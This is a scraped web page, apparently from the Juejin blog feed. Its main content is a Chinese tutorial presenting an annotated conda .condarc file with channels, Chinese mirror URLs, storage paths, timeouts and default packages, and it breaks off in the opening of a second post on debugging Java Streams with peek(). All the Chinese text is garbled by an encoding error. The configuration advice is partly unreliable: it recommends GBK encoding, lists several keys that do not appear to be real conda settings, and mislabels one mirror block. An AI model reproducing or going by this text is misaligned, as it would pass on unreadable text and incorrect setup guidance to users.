#4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p><code>.condarc</code><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.conda.org.cn%2Fprojects%2Fconda%2Fen%2Fstable%2Fuser-guide%2Fconfiguration%2Fuse-condarc.html" target="_blank" title="https://docs.conda.org.cn/projects/conda/en/stable/user-guide/configuration/use-condarc.html" ref="nofollow noopener noreferrer">é…ç½®æ–‡ä»¶å®˜æ–¹è¯´æ˜æ–‡æ¡£</a></p>
<p><code>Conda</code>æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„åŒ…ç®¡ç†å·¥å…·ï¼Œå®ƒèƒ½å¤Ÿå¸®åŠ©ç”¨æˆ·è½»æ¾åœ°ç®¡ç†<code>Python</code>åŒ…ã€ç¯å¢ƒåŠå…¶ä¾èµ–ã€‚ç„¶è€Œ<code>Conda</code>çš„é…ç½®æ–‡ä»¶ (<code>.condarc</code>) èƒ½æ˜¾è‘—æé«˜åŒ…å®‰è£…é€Ÿåº¦ã€èŠ‚çœç£ç›˜ç©ºé—´ï¼Œå¹¶ç¡®ä¿ä½ åœ¨å®‰è£…å’Œç®¡ç†ç¯å¢ƒæ—¶æœ‰æ›´å¥½çš„æ§åˆ¶ã€‚</p>
<h2 data-id="heading-1">æ–‡ä»¶ç¼–ç æ ¼å¼</h2>
<p>ä¿å­˜<code>.condarc</code>é…ç½®æ–‡ä»¶æ—¶ï¼Œåº”è¯¥ä½¿ç”¨<code>GBK</code>ç¼–ç æ ¼å¼ï¼Œä»¥ç¡®ä¿æ–‡ä»¶ä¸­çš„ä¸­æ–‡å­—ç¬¦ä»¥åŠå…¶ä»–é<code>ASCII</code>å­—ç¬¦èƒ½å¤Ÿæ­£ç¡®ä¿å­˜å’Œè¯»å–ã€‚</p>
<h2 data-id="heading-2">.condarcæ–‡ä»¶è¯¦è§£</h2>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># æ˜¯å¦å¯ç”¨ SSL éªŒè¯ï¼Œé»˜è®¤ä¸º trueã€‚å¦‚æœè®¾ç½®ä¸º falseï¼ŒConda ä¼šå¿½ç•¥ SSL è¯ä¹¦éªŒè¯ã€‚</span>
<span class="hljs-comment"># åœ¨ä¸ä¿¡ä»»çš„ç½‘ç»œç¯å¢ƒä¸­ä¸å»ºè®®ç¦ç”¨ SSL éªŒè¯ã€‚</span>
<span class="hljs-comment"># ssl_verify: true</span>
 
<span class="hljs-comment"># è®¾ç½® Conda çš„åŒ…ä¸‹è½½æºï¼ˆé¢‘é“ï¼‰ã€‚</span>
<span class="hljs-comment"># Conda ä¼šä»è¿™é‡Œçš„æœåŠ¡å™¨ä¸‹è½½æ‰€éœ€çš„åŒ…ã€‚</span>
<span class="hljs-attr">channels:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">defaults</span>  <span class="hljs-comment"># å®˜æ–¹é»˜è®¤æºï¼ŒConda å®˜æ–¹ç»´æŠ¤ã€‚</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">conda-forge</span>  <span class="hljs-comment"># ç¤¾åŒºé©±åŠ¨çš„æºï¼ŒåŒ…å«å¤§é‡çš„ç¬¬ä¸‰æ–¹åŒ…</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">nvidia</span>  <span class="hljs-comment"># NVIDIA å®˜æ–¹æºï¼Œç”¨äºå®‰è£…ä¸ GPU ç›¸å…³çš„åŒ…ï¼ˆå¦‚ CUDAã€cuDNN ç­‰ï¼‰</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">pytorch</span>  <span class="hljs-comment"># PyTorch å®˜æ–¹æºï¼Œæä¾› PyTorch ç›¸å…³çš„åŒ…å’Œå·¥å…·</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">https://repo.anaconda.com/pkgs/r/</span>  <span class="hljs-comment"># Anaconda å®˜æ–¹çš„ R åŒ…æºã€‚</span>
  
  <span class="hljs-comment"># ä»¥ä¸‹æ˜¯ä¸€äº›å¯é€‰çš„é•œåƒæºï¼Œé€‚ç”¨äºä¸­å›½åœ°åŒºï¼Œé€šå¸¸ä¼šæä¾›æ›´å¿«çš„ä¸‹è½½é€Ÿåº¦ã€‚</span>
  <span class="hljs-comment"># ä½¿ç”¨æ—¶å¯ä»¥å–æ¶ˆæ³¨é‡Šï¼Œå¹¶æ ¹æ®éœ€è¦é€‰æ‹©é•œåƒæºã€‚</span>
  <span class="hljs-comment"># - https://mirrors.tuna.tsinghua.edu.cn/anaconda/conda-forge  # æ¸…åå¤§å­¦é•œåƒæº</span>
  <span class="hljs-comment"># - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r  # æ¸…åå¤§å­¦é•œåƒæºä¸­çš„ R åŒ…</span>
  <span class="hljs-comment"># - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main  # æ¸…åå¤§å­¦é•œåƒæºä¸­çš„ä¸»åŒ…</span>
  <span class="hljs-comment"># - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free  # æ¸…åå¤§å­¦é•œåƒæºä¸­çš„å…è´¹åŒ…</span>
 
  <span class="hljs-comment"># - https://mirrors.ustc.edu.cn/anaconda/conda-forge  # ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦é•œåƒæº</span>
  <span class="hljs-comment"># - https://mirrors.ustc.edu.cn/anaconda/pkgs/r  # ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦é•œåƒæºä¸­çš„ R åŒ…</span>
  <span class="hljs-comment"># - https://mirrors.ustc.edu.cn/anaconda/pkgs/main  # ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦é•œåƒæºä¸­çš„ä¸»åŒ…ï¼ŒConda å®˜æ–¹ä¸»æº</span>
  <span class="hljs-comment"># - https://mirrors.ustc.edu.cn/anaconda/pkgs/free  # USTC Conda å®˜æ–¹å…è´¹æºã€‚</span>
  
  <span class="hljs-comment"># - https://mirrors.aliyun.com/pypi/simple  # é˜¿é‡Œäº‘ PyPI é•œåƒæº</span>
  <span class="hljs-comment"># - https://mirrors.aliyun.com/anaconda/conda-forge  # é˜¿é‡Œäº‘ Conda-forge é•œåƒæº</span>
  <span class="hljs-comment"># - https://mirrors.aliyun.com/anaconda/pkgs/r  # é˜¿é‡Œäº‘ R åŒ…æº</span>
  <span class="hljs-comment"># - https://mirrors.aliyun.com/anaconda/pkgs/main  # é˜¿é‡Œäº‘ Conda ä¸»åŒ…æº</span>
  <span class="hljs-comment"># - https://mirrors.aliyun.com/anaconda/pkgs/free  # é˜¿é‡Œäº‘ Conda å…è´¹åŒ…æº</span>
 
<span class="hljs-comment"># è®¾ç½® Conda ç¯å¢ƒå­˜å‚¨çš„ç›®å½•ã€‚æ‰€æœ‰ Conda ç¯å¢ƒéƒ½å°†ä¿å­˜åœ¨è¿™é‡ŒæŒ‡å®šçš„è·¯å¾„ä¸‹ã€‚</span>
<span class="hljs-attr">envs_dirs:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">D:/anaconda3/envs</span>  <span class="hljs-comment"># è®¾ç½® Conda ç¯å¢ƒçš„å­˜å‚¨è·¯å¾„ä¸º D ç›˜ä¸‹çš„ anaconda3/envs æ–‡ä»¶å¤¹ã€‚</span>
  
<span class="hljs-comment"># è®¾ç½® Conda ä¸‹è½½çš„åŒ…å­˜å‚¨è·¯å¾„ã€‚æ‰€æœ‰ä¸‹è½½çš„åŒ…å°†ä¿å­˜åœ¨è¿™é‡ŒæŒ‡å®šçš„ç›®å½•ã€‚</span>
<span class="hljs-attr">pkgs_dirs:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">D:/anaconda3/pkgs</span>  <span class="hljs-comment"># è®¾ç½® Conda åŒ…çš„å­˜å‚¨è·¯å¾„ä¸º D ç›˜ä¸‹çš„ anaconda3/pkgs æ–‡ä»¶å¤¹ã€‚</span>
 
<span class="hljs-comment"># # è®¾ç½®è‡ªå®šä¹‰æº</span>
<span class="hljs-comment"># # å¦‚æœå¸Œæœ›ä¸º Conda é¢‘é“è®¾ç½®è‡ªå®šä¹‰æºï¼Œå¯ä»¥åœ¨è¿™é‡Œå¯ç”¨ã€‚æ­¤éƒ¨åˆ†å·²ç»è¢«æ³¨é‡Šæ‰äº†ï¼Œå¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹ã€‚</span>
<span class="hljs-comment"># custom_channels:</span>
<span class="hljs-comment">#   # ä»¥ä¸‹æ˜¯æ¸…åå¤§å­¦ï¼ˆTUNAï¼‰æä¾›çš„é•œåƒæºï¼š</span>
<span class="hljs-comment">#   conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/conda-forge  # è‡ªå®šä¹‰ Conda-forge é¢‘é“çš„æºåœ°å€ã€‚</span>
<span class="hljs-comment">#   msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/msys2  # è‡ªå®šä¹‰ msys2 é¢‘é“çš„æºåœ°å€ã€‚</span>
<span class="hljs-comment">#   bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/bioconda  # è‡ªå®šä¹‰ bioconda é¢‘é“çš„æºåœ°å€ã€‚</span>
<span class="hljs-comment">#   # ä»¥ä¸‹æ˜¯ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ï¼ˆUSTCï¼‰æä¾›çš„é•œåƒæºï¼š</span>
<span class="hljs-comment">#   conda-forge: https://mirrors.aliyun.com/anaconda/conda-forge  # é˜¿é‡Œäº‘ Conda-forge é¢‘é“çš„æºåœ°å€ã€‚</span>
<span class="hljs-comment">#   msys2: https://mirrors.aliyun.com/anaconda/msys2  # é˜¿é‡Œäº‘ msys2 é¢‘é“çš„æºåœ°å€ã€‚</span>
<span class="hljs-comment">#   bioconda: https://mirrors.aliyun.com/anaconda/bioconda  # é˜¿é‡Œäº‘ bioconda é¢‘é“çš„æºåœ°å€ã€‚</span>
<span class="hljs-comment">#   # ä»¥ä¸‹æ˜¯ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ï¼ˆUSTCï¼‰æä¾›çš„é•œåƒæºï¼š</span>
<span class="hljs-comment">#   conda-forge: https://mirrors.ustc.edu.cn/anaconda/conda-forge  # USTC Conda-forge é¢‘é“çš„æºåœ°å€ã€‚</span>
<span class="hljs-comment">#   msys2: https://mirrors.ustc.edu.cn/anaconda/msys2  # USTC msys2 é¢‘é“çš„æºåœ°å€ã€‚</span>
<span class="hljs-comment">#   bioconda: https://mirrors.ustc.edu.cn/anaconda/bioconda  # USTC bioconda é¢‘é“çš„æºåœ°å€ã€‚</span>
 
 
<span class="hljs-comment"># è®¾ç½®ä»£ç†ï¼ˆå¦‚æœéœ€è¦ï¼‰</span>
<span class="hljs-comment"># è®¾ç½®ä»£ç†é€‰é¡¹ã€‚é…ç½®ä»£ç†æœåŠ¡å™¨æ—¶ï¼Œå¯ä»¥æŒ‡å®š HTTP å’Œ HTTPS ä»£ç†ã€‚</span>
<span class="hljs-comment"># å¦‚æœä½ åœ¨æŸäº›ç½‘ç»œç¯å¢ƒä¸‹éœ€è¦é€šè¿‡ä»£ç†è®¿é—®äº’è”ç½‘ï¼Œå¯ä»¥å–æ¶ˆæ³¨é‡Šå¹¶å¡«å†™ç›¸åº”çš„ä»£ç†åœ°å€ã€‚</span>
<span class="hljs-comment"># æ³¨æ„ï¼šè¯·æ›¿æ¢ä¸ºä½ æ‰€åœ¨ç½‘ç»œç¯å¢ƒä¸‹çš„ä»£ç†æœåŠ¡å™¨åœ°å€å’Œç«¯å£ã€‚</span>
 
<span class="hljs-comment"># proxy_servers:</span>
<span class="hljs-comment">#   http: http://your_proxy_server:port  # è®¾ç½® HTTP ä»£ç†</span>
<span class="hljs-comment">#   https: https://your_proxy_server:port  # è®¾ç½® HTTPS ä»£ç†</span>
 
<span class="hljs-comment"># é…ç½® Conda çš„æ—¥å¿—æ–‡ä»¶ã€‚</span>
<span class="hljs-comment"># Conda ä¼šå°†æ—¥å¿—è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼Œä¾¿äºè°ƒè¯•å’Œè®°å½•æ“ä½œã€‚</span>
<span class="hljs-comment"># ä½ å¯ä»¥è®¾ç½®ä¸€ä¸ªè‡ªå®šä¹‰çš„æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼Œè®°å½• Conda çš„è¯¦ç»†æ“ä½œä¿¡æ¯ã€‚</span>
<span class="hljs-comment"># å¦‚æœä¸è®¾ç½®ï¼ŒConda ä¼šå°†æ—¥å¿—å­˜å‚¨åœ¨é»˜è®¤çš„ä½ç½®ã€‚</span>
<span class="hljs-comment"># è®¾ç½® Conda çš„æ—¥å¿—æ–‡ä»¶è·¯å¾„</span>
<span class="hljs-comment"># log_file: D:/anaconda3/conda.log  </span>
 
<span class="hljs-comment"># å¦‚æœå¸Œæœ› Conda è¾“å‡ºæ›´è¯¦ç»†çš„è°ƒè¯•ä¿¡æ¯ï¼Œå¯ä»¥è®¾ç½®ä¸º trueã€‚è¿™æ ·å¯ä»¥åœ¨å‡ºç°é—®é¢˜æ—¶ï¼Œæä¾›æ›´å¤šçš„è¯Šæ–­ä¿¡æ¯ã€‚</span>
<span class="hljs-comment"># de<span class="hljs-doctag">bug:</span> true</span>
 
<span class="hljs-comment"># è®¾ç½®è¿œç¨‹è¿æ¥è¶…æ—¶çš„ç§’æ•°</span>
<span class="hljs-comment"># è¿æ¥è¿œç¨‹æœåŠ¡å™¨æ—¶çš„è¶…æ—¶æ—¶é—´è®¾ç½®ï¼ˆå•ä½ï¼šç§’ï¼‰ã€‚å¦‚æœè¿æ¥æ—¶é—´è¶…è¿‡æŒ‡å®šçš„ç§’æ•°ï¼ŒConda ä¼šä¸­æ­¢è¿æ¥ã€‚</span>
<span class="hljs-attr">remote_connect_timeout_secs:</span> <span class="hljs-number">60.0</span>  <span class="hljs-comment"># è®¾ç½®è¿œç¨‹è¿æ¥çš„è¶…æ—¶æ—¶é—´ä¸º 60 ç§’ã€‚</span>
 
<span class="hljs-comment"># è®¾ç½®è¿œç¨‹æ•°æ®è¯»å–è¶…æ—¶çš„ç§’æ•°</span>
<span class="hljs-comment"># è¯»å–è¿œç¨‹æœåŠ¡å™¨æ•°æ®æ—¶çš„è¶…æ—¶æ—¶é—´è®¾ç½®ï¼ˆå•ä½ï¼šç§’ï¼‰ã€‚å¦‚æœè¯»å–æ•°æ®è¶…è¿‡æŒ‡å®šçš„ç§’æ•°ï¼ŒConda ä¼šä¸­æ­¢æ“ä½œã€‚</span>
<span class="hljs-attr">remote_read_timeout_secs:</span> <span class="hljs-number">60.0</span>  <span class="hljs-comment"># è®¾ç½®è¯»å–è¿œç¨‹æ•°æ®çš„è¶…æ—¶æ—¶é—´ä¸º 60 ç§’ã€‚</span>
 
<span class="hljs-comment"># è®¾ç½®æ˜¯å¦æ˜¾ç¤ºé¢‘é“çš„ URLã€‚</span>
<span class="hljs-comment"># å¦‚æœä¸º trueï¼ŒConda ä¼šåœ¨å®‰è£…åŒ…æ—¶æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨çš„æºåœ°å€ã€‚</span>
<span class="hljs-comment"># è¿™å¯¹äºè°ƒè¯•æˆ–æŸ¥çœ‹ä»å“ªäº›æºä¸‹è½½åŒ…æœ‰å¸®åŠ©ã€‚</span>
<span class="hljs-attr">show_channel_urls:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># è®¾ç½®ä¸º trueï¼Œæ˜¾ç¤ºé¢‘é“çš„ URLã€‚</span>
 
<span class="hljs-comment"># å®šä¹‰åœ¨æ¯ä¸ªæ–°ç¯å¢ƒä¸­é»˜è®¤å®‰è£…çš„åŒ…</span>
<span class="hljs-attr">default_packages:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">numpy</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">pandas</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">matplotlib</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">scikit-learn</span>
 
<span class="hljs-comment"># æ–°ç¯å¢ƒä¸­ä½¿ç”¨çš„é»˜è®¤ Python ç‰ˆæœ¬</span>
<span class="hljs-attr">default_envs:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">python=3.10</span>
 
<span class="hljs-comment"># ç¦ç”¨ Conda çš„è‡ªåŠ¨æ›´æ–°</span>
<span class="hljs-attr">auto_update_conda:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># é˜²æ­¢ Conda è‡ªåŠ¨æ›´æ–°</span>
 
<span class="hljs-comment"># å¯ç”¨å¹¶è¡Œä¸‹è½½ï¼Œä»¥åŠ å¿«åŒ…çš„å®‰è£…é€Ÿåº¦</span>
<span class="hljs-attr">parallel_downloads:</span> <span class="hljs-number">5</span>  <span class="hljs-comment"># åŒæ—¶ä¸‹è½½æœ€å¤š 5 ä¸ªåŒ…</span>
 
<span class="hljs-comment"># ä½¿ç”¨ç¦»çº¿æ¨¡å¼ï¼ˆä¸éœ€è¦äº’è”ç½‘å³å¯å®‰è£…åŒ…ï¼‰</span>
<span class="hljs-attr">offline:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># ç¦ç”¨ç¦»çº¿æ¨¡å¼ï¼Œå…è®¸è®¿é—®äº’è”ç½‘å®‰è£…åŒ…</span>
</code></pre>
<p>æºåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2FTuige123%2Farticles%2F18771289%2312__254" target="_blank" title="https://www.cnblogs.com/Tuige123/articles/18771289#12__254" ref="nofollow noopener noreferrer">www.cnblogs.com/Tuige123/arâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[280. Java Stream API - Debugging Streamsï¼šå¦‚ä½•è°ƒè¯• Java æµå¤„ç†è¿‡ç¨‹ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589893746081054761</link>    <guid>https://juejin.cn/post/7589893746081054761</guid>    <pubDate>2026-01-02T00:43:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893746081054761" data-draft-id="7589916567876206634" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="280. Java Stream API - Debugging Streamsï¼šå¦‚ä½•è°ƒè¯• Java æµå¤„ç†è¿‡ç¨‹ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T00:43:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CacheæŠ€æœ¯åˆ†äº«"/> <meta itemprop="url" content="https://juejin.cn/user/1662117313262776"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            280. Java Stream API - Debugging Streamsï¼šå¦‚ä½•è°ƒè¯• Java æµå¤„ç†è¿‡ç¨‹ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1662117313262776/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CacheæŠ€æœ¯åˆ†äº«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T00:43:20.000Z" title="Fri Jan 02 2026 00:43:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">280. Java Stream API - Debugging Streamsï¼šå¦‚ä½•è°ƒè¯• Java æµå¤„ç†è¿‡ç¨‹ï¼Ÿ</h2>
<hr/>
<h4 data-id="heading-1">ğŸ¯ æœ¬èŠ‚ç›®æ ‡</h4>
<ul>
<li>ç†è§£ <code>peek()</code> çš„ä½œç”¨ä¸ç”¨é€”</li>
<li>æ­£ç¡®ä½¿ç”¨ <code>peek()</code> è§‚å¯Ÿæµä¸­æ•°æ®çš„â€œæ—…ç¨‹â€</li>
<li>æ˜ç¡® <code>peek()</code> çš„<strong>ä½¿ç”¨è¾¹ç•Œ</strong>ï¼šä»…é™è°ƒè¯•ï¼Œç¦æ­¢ç”¨äºä¸šåŠ¡é€»è¾‘</li>
</ul>
<hr/>
<h3 data-id="heading-2">ğŸš§ ä¸ºä»€ä¹ˆè°ƒè¯• Stream è¿™ä¹ˆéš¾ï¼Ÿ</h3>
<p>åœ¨ä¼ ç»Ÿçš„ <code>for</code> å¾ªç¯ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°ä½¿ç”¨ <code>System.out.println()</code> æˆ–æ–­ç‚¹æŸ¥çœ‹å˜é‡çŠ¶æ€ã€‚ä½†ä¸€æ—¦ä½¿ç”¨äº† <code>Stream</code>ï¼š</p>
<ul>
<li>æµæ“ä½œæ˜¯æƒ°æ€§æ‰§è¡Œçš„ï¼ˆ<strong><code>lazy</code></strong>ï¼‰</li>
<li>å¾ˆéš¾åœ¨åˆé€‚çš„ä½ç½®æ‰“æ–­ç‚¹</li>
